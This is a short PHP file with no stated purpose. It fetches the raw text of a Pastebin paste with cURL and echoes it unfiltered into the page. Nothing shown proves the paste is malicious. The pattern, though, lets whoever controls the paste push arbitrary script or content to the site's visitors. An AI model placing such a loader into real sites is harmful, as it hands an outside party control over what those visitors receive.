<?php $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://pastebin.com/raw/Gim0SG31");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
curl_close($ch);
echo $output;
?>
